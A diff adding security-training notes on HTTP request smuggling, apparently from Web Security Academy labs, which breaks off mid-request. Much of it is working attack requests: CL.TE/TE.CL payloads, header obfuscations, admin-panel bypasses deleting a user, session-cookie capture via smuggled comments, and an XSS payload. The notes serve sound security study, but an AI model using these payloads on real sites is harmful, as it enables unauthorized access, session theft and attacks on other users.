@@ -1,0 +1,2041 @@
+								## HTTP request smuggling
+								
+# HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. 
+# Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. 	
+
+# Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. 
+# Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. 
+# This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications. 		
+
+# When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. 
+# The protocol is very simple: HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins: 		
+			
+								## How do HTTP request smuggling vulnerabilities arise?
+								
+#  Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header. 
+
+# The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:
+
+--------------------------------------------------------------
+POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+---------------------------------------------------------------
+
+# The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. 
+# This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. 
+# The message is terminated with a chunk of size zero. For example: 
+
+-----------------------------------------------------------------
+POST /search HTTP/1.1
+Host: normal-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+b
+q=smuggling
+0
+------------------------------------------------------------------------
+
+
+Note
+
+<> Many security testers are unaware that chunked encoding can be used in HTTP requests, for two reasons:
+
+    * Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit.
+    * Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.
+
+
+
+# Since the HTTP specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. 
+# The HTTP specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. 
+# This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. 
+# In this situation, problems can arise for two reasons:
+
+
+    * Some servers do not support the Transfer-Encoding header in requests.
+    * Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
+    
+# If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.     
+    
+    							 ## How to perform an HTTP request smuggling attack
+    							 
+# Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. 
+# The exact way in which this is done depends on the behavior of the two servers:    	
+
+		# CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. 
+		# TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. 
+		# TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by 					 		obfuscating the header in some way.	
+		
+		
+							## CL.TE vulnerabilities
+							
+#  Here, the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. We can perform a simple HTTP request smuggling attack as follows:
+
+-----------------------------------------------------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+-----------------------------------------------------	
+
+# The front-end server processes the Content-Length header and determines that the request body is 13 bytes long, up to the end of SMUGGLED. 
+# This request is forwarded on to the back-end server.
+
+# The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. 
+# It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. 
+# The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence. 
+
+
+							## TE.CL vulnerabilities
+							
+# Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. 
+# We can perform a simple HTTP request smuggling attack as follows: 		
+
+-------------------------------------------------------------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+-------------------------------------------------------------------
+
+<> Note
+
+# To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
+
+# You need to include the trailing sequence \r\n\r\n following the final 0.
+
+# The front-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. 
+# It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following SMUGGLED. 
+# It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. 
+# This request is forwarded on to the back-end server.
+
+# The back-end server processes the Content-Length header and determines that the request body is 3 bytes long, up to the start of the line following 8. 
+# The following bytes, starting with SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence. 																 
+    
+Example:
+----------------------------------------------------------------
+POST / HTTP/1.1
+Host: 0a6800d90301a132c08136ab00340055.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+------------------------------
+
+							## TE.TE behavior: obfuscating the TE header
+							
+# Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. 
+
+# There are potentially endless ways to obfuscate the Transfer-Encoding header. For example: 
+
+---------------------------------
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+-------------------------------
+
+# Each of these techniques involves a subtle departure from the HTTP specification. 
+# Real-world code that implements a protocol specification rarely adheres to it with absolute precision, and it is common for different implementations to tolerate different variations from the specification. 
+# To uncover a TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
+
+# Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities already described. 							
+ 
+
+<> Lab: HTTP request smuggling, obfuscating the TE header   
+
+--------------------------------------------
+POST / HTTP/1.1
+Host: 0a4b00fb03651c64c2084e0700950091.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+----------------------------------------------------------------
+
+
+								## How to identify HTTP request smuggling vulnerabilitity
+								
+# In this section, we'll explain different techniques for finding HTTP request smuggling vulnerabilities. 
+
+<> Finding HTTP request smuggling vulnerabilities using timing techniques
+
+# The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. 
+
+# This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities. 
+
+<> Finding CL.TE vulnerabilities using timing techniques
+
+# If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay: 
+
+-----------------------------------------------------------------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X (Ommited)
+----------------------------------------------------
+
+# Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. 
+# The back-end server uses the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. 
+# This will cause an observable time delay. 
+
+TIP
+0 is the first character counted in your first example, but newlines in HTTP are usually CRLF (\r\n) which is two characters. Accordingly:
+
+0\r\n            3 characters
+\r\n            +2 characters
+SMUGGLED        +8 characters equals 13 characters (no trailing CRLF)
+--------------------------------------------------------------------------------
+
+
+All 3 of them represent the end of a line. But...
+
+ 1.   \r (Carriage Return) → moves the cursor to the beginning of the line without advancing to the next line
+ 2.  \n (Line Feed) → moves the cursor down to the next line without returning to the beginning of the line — In a *nix environment \n moves to the beginning of the line.
+ 3.  \r\n (End Of Line) → a combination of \r and \n
+
+--------------------------------------------------------------------------------
+
+<> Finding TE.CL vulnerabilities using timing techniques
+
+# If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay: 
+
+------------------------------------------------------------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+------------------------------------------------------
+# Since the front-end server uses the Transfer-Encoding header, it will forward only part of this request, omitting the X. 
+# The back-end server uses the Content-Length header, expects more content in the message body, and waits for the remaining content to arrive. 
+# This will cause an observable time delay. 
+
+
+<> Note
+
+# The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. 
+# So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
+
+
+						## Confirming HTTP request smuggling vulnerabilities using differential responses
+
+# When a probable request smuggling vulnerability has been detected, you can obtain further evidence for the vulnerability by exploiting it to trigger differences in the contents of the application's responses. 
+
+# This involves sending two requests to the application in quick succession: 	
+
+
+    1. An "attack" request that is designed to interfere with the processing of the next request.
+    2. A "normal" request.
+
+# If the response to the normal request contains the expected interference, then the vulnerability is confirmed. 
+ 
+#  For example, suppose the normal request looks like this: 
+
+----------------------------------------------------
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+-------------------------------------------------
+
+# This request normally receives an HTTP response with status code 200, containing some search results.
+
+# The attack request that is needed to interfere with this request depends on the variant of request smuggling that is present: CL.TE vs TE.CL.  
+
+					## Confirming CL.TE vulnerabilities using differential responses
+
+#  To confirm a CL.TE vulnerability, you would send an attack request like this: 
+
+---------------------------------------------------
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+-----------------------------------------------------------
+
+# If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. 
+# This will cause the subsequent "normal" request to look like this: 
+
+------------------------------------------------------------
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+---------------------------------------------------------
+
+# Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it. 
+
+
+<> Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses					   
+
+---------------------------------
+POST / HTTP/1.1
+Host: 0aa800e50337b990c205255300d5008b.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+-------------------------------------
+
+							## Confirming TE.CL vulnerabilities using differential responses	
+							
+# To confirm a TE.CL vulnerability, you would send an attack request like this: 
+
+---------------------------------------------------------------
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+---------------------------------------------------
+
+# If the attack is successful, then everything from GET /404 onwards is treated by the back-end server as belonging to the next request that is received. 
+# This will cause the subsequent "normal" request to look like this:
+
+-------------------------------------------------------
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+-------------------------------------------------------------
+
+# Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it. 
+
+<> Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+-----------------------------------------------------------
+POST / HTTP/1.1
+Host: 0aa5008a04ffbe9ac03177e7001d0046.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+------------------------------------------------
+
+
+<> Note
+
+1. Some important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:
+
+2. The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
+
+3. The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
+
+4. When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
+
+5. In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
+z
+
+6. If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.
+
+
+								## Exploiting HTTP request smuggling vulnerabilities
+
+<> Using HTTP request smuggling to bypass front-end security controls
+
+# In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. 
+# Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls.			
+
+# For example, suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL. 
+# The back-end server then honors every request without further checking. In this situation, an HTTP request smuggling vulnerability can be used to bypass the access controls, by smuggling a request to a restricted URL.	
+
+# Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack: 
+
+---------------------------------------------------------------
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
+----------------------------------------------------------------
+
+# The front-end server sees two requests here, both for /home, and so the requests are forwarded to the back-end server. 
+# However, the back-end server sees one request for /home and one request for /admin. 
+# It assumes (as always) that the requests have passed through the front-end controls, and so grants access to the restricted URL. 
+
+<> Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. 
+# There's an admin panel at /admin, but the front-end server blocks access to it.
+
+--------------------------------------------------------------------------------------------------
+1. Try to visit /admin and observe that the request is blocked.
+
+    Using Burp Repeater, issue the following request twice:
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 37
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin HTTP/1.1
+    X-Ignore: X
+   
+2. Observe that the merged request to /admin was rejected due to not using the header Host: localhost.
+
+    Issue the following request twice:
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 54
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin HTTP/1.1
+    Host: localhost
+    X-Ignore: X
+    
+3. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
+
+4. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 116
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin HTTP/1.1
+    Host: localhost
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=
+
+5. Observe that you can now access the admin panel.
+
+    Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 139
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    Host: localhost
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=
+--------------------------------------------------------------------------------------------------------------------------------------
+
+<> Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+SOLUTION:
+
+1. Try to visit /admin and observe that the request is blocked.
+2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
+
+3. Using Burp Repeater, issue the following request twice:
+
+----------------------------------------------------------
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+60
+POST /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+------------------------------------------------------------
+
+<> Note
+# You need to include the trailing sequence \r\n\r\n following the final 0.
+
+4. Observe that the merged request to /admin was rejected due to not using the header Host: localhost.
+
+5. Issue the following request twice:
+
+------------------------------------------------------------
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+Observe that you can now access the admin panel.
+
+Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+-----------------------------------------------------------------------------------
+
+							  ## Revealing front-end request rewriting
+
+#  In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers. 
+
+# For example, the front-end server might:
+
+    1. terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
+    2. add an X-Forwarded-For header containing the user's IP address;
+    3. determine the user's ID based on their session token and add a header identifying the user; or
+    4. add some sensitive information that is of interest for other attacks.
+    
+# In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.
+
+# There is often a simple way to reveal exactly how the front-end server is rewriting requests. 
+# To do this, you need to perform the following steps:     
+
+
+    1. Find a POST request that reflects the value of a request parameter into the application's response.
+    2. Shuffle the parameters so that the reflected parameter appears last in the message body.
+    3. Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.
+    
+<> Example:
+
+1. Suppose an application has a login function that reflects the value of the email parameter:
+
+-------------------------------------------------------------------------
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+email=wiener@normal-user.net    
+---------------------------------------------------------------
+
+2. This results in a response containing the following:
+
+<input id="email" value="wiener@normal-user.net" type="text">
+
+3. Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:
+
+------------------------------------------------------------------------
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=POST /login HTTP/1.1
+Host: vulnerable-website.com
+...
+
+--------------------------------------------------------------------------
+
+# The requests will be rewritten by the front-end server to include the additional headers, and then the back-end server will process the smuggled request and treat the rewritten second request as being the value of the email parameter. 
+
+# It will then reflect this value back in the response to the second request: 
+
+-------------------------------------
+
+<input id="email" value="POST /login HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 1.3.3.7
+X-Forwarded-Proto: https
+X-TLS-Bits: 128
+X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+X-TLS-Version: TLSv1.2
+x-nr-external-service: external
+...
+
+--------------------------------------------------
+
+
+<> Note
+
+# Since the final request is being rewritten, you don't know how long it will end up. 
+# The value in the Content-Length header in the smuggled request will determine how long the back-end server believes the request is. 
+# If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.
+
+# Once you have revealed how the front-end server is rewriting requests, you can apply the necessary rewrites to your smuggled requests, to ensure they are processed in the intended way by the back-end server. 
+
+
+<> Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+
+#  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+# There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. 
+# The front-end server adds an HTTP header to incoming requests containing their IP address. 
+# It's similar to the X-Forwarded-For header but has a different name. 			
+
+Site: https://string-functions.com/length.aspx
+
+--------------------------------------------------------
+1. Browse to /admin and observe that the admin panel can only be loaded from 127.0.0.1.
+2. Use the site's search function and observe that it reflects the value of the search parameter.
+
+3. Use Burp Repeater to issue the following request twice.
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 124
+    Transfer-Encoding: chunked
+
+    0
+
+    POST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 200
+    Connection: close
+
+    search=test
+    
+4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
+
+5. Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel:
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 143
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin HTTP/1.1
+    X-abcdef-Ip: 127.0.0.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+    Connection: close
+
+    x=1
+
+6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 166
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    X-abcdef-Ip: 127.0.0.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+    Connection: close
+
+    x=1
+
+-----------------------------------------------------------------------------------------------------------------------				  
+
+								## Bypassing client authentication
+								
+# As part of the TLS handshake, servers authenticate themselves with the client (usually a browser) by providing a certificate. 
+# This certificate contains their "common name" (CN), which should match their registered hostname. 
+# The client can then use this to verify that they're talking to a legitimate server belonging to the expected domain. 	
+
+# Some sites go one step further and implement a form of mutual TLS authentication, where clients must also present a certificate to the server. 
+# In this case, the client's CN is often a username or suchlike, which can be used in the back-end application logic as part of an access control mechanism, for example.				
+
+# The component that authenticates the client typically passes the relevant details from the certificate to the application or back-end server via one or more non-standard HTTP headers. 
+# For example, front-end servers sometimes append a header containing the client's CN to any incoming requests:
+			
+GET /admin HTTP/1.1
+Host: normal-website.com
+X-SSL-CLIENT-CN: carlos
+
+# As these headers are supposed to be completely hidden from users, they are often implicitly trusted by back-end servers. 
+# Assuming you're able to send the right combination of headers and values, this may enable you to bypass access controls. 
+
+# In practice, this behavior isn't usually exploitable because front-end servers tend to overwrite these headers if they're already present. 
+# However, smuggled requests are hidden from the front-end altogether, so any headers they contain will be sent to the back-end unchanged. 
+
+------------------------------------------------------------
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 64
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-SSL-CLIENT-CN: administrator
+Foo: x
+----------------------------------------------------
+
+								<> Capturing other users' requests
+
+# If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. 
+# These may include session tokens or other sensitive data submitted by the user. 
+# Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on. 
+
+# To perform the attack, you need to smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request. 
+# For example, suppose an application uses the following request to submit a blog post comment, which will be stored and displayed on the blog: 
+
+-------------------------------------------------------------------------------------------------------------
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
+------------------------------------------------------------------------------------------------------
+
+# Now consider what would happen if you smuggle an equivalent request with an overly long Content-Length header and the comment parameter positioned at the end of the request as follows:
+
+--------------------------------------------------------------------------
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 330
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+------------------------------------------------------------------------
+
+# The Content-Length header of the smuggled request indicates that the body will be 400 bytes long, but we've only sent 144 bytes. 
+# In this case, the back-end server will wait for the remaining 256 bytes before issuing the response, or else issue a timeout if this doesn't arrive quick enough. 
+# As a result, when another request is sent to the back-end server down the same connection, the first 256 bytes are effectively appended to the smuggled request as follows: 
+
+--------------------------------------------------------------------------------------------
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
+... 
+-------------------------------------------------------------------------------------------
+
+# As the start of the victim's request is contained in the comment parameter, this will be posted as a comment on the blog, enabling you to read it simply by visiting the relevant post. 
+
+# To capture more of the victim's request, you just need to increase the value of the smuggled request's Content-Length header accordingly, but note that this will involve a certain amount of trial and error. 
+# If you encounter a timeout, this probably means that the Content-Length you've specified is higher than the actual length of the victim's request. 
+# In this case, simply reduce the value until the attack works again. 
+
+
+<> Note
+
+# One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. 
+# For URL-encoded form submissions, this will be the & character, meaning that the content that is stored from the victim user's request will end at the first &, which might even appear in the query string
+
+-------------------------------------------------------------------
+POST / HTTP/1.1
+Host: 0aab00e4047890fdc3c6296000f2001d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 268
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=lhUbXHtzOgEoxjAWRdgGoPgphuJUjzTr
+
+csrf=cmg9OjmMTX0oaj5bHI7hhBDao7acFM3Z&postId=3&name=diodyuo&email=carlos%40normal-user.net&website=&comment=test
+
+---------------------------------------------------------------------
+
+							## Using HTTP request smuggling to exploit reflected XSS
+		
+# If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application. This approach is superior to normal exploitation of reflected XSS in two ways:
+
+# It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it. 
+# You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
+# It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
+
+# For example, suppose an application has a reflected XSS vulnerability in the User-Agent header. You can exploit this in a request smuggling attack as follows:
+
+---------------------------------------------------------------
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Foo: X
+
+-------------------------------------------
+
+# The next user's request will be appended to the smuggled request, and they will receive the reflected XSS payload in the response.  					
+
+<> Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+#  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. 
+# The application is also vulnerable to reflected XSS via the User-Agent header. 
+
+----------------------------------------------------------------------------------------------------------
+1. Visit a blog post, and send the request to Burp Repeater.
+2. Observe that the comment form contains your User-Agent header in a hidden input.
+
+3. Inject an XSS payload into the User-Agent header and observe that it gets reflected:
+    "/><script>alert(1)</script>
+
+4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
